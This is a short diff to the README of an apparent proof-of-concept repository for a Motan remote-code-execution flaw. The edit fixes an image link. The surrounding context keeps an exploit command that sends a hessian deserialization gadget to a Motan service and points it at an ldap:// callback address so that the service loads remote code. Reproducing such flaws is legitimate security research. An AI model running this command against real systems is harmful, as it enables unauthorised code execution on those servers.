@@ -9,7 +9,7 @@
 ```
 java -jar dubbo-exp-1.0-SNAPSHOT-jar-with-dependencies.jar --target 127.0.0.1:8002 --protocol motan --serialization hessian  --gadget spring-aop --arg ldap://127.0.0.1:9988
 ```
-[](https://github.com/zhzhdoai/Motan-rce/blob/master/poc.png)
+![](https://github.com/zhzhdoai/Motan-rce/blob/master/poc.png)
 
 ## 漏洞复现
 
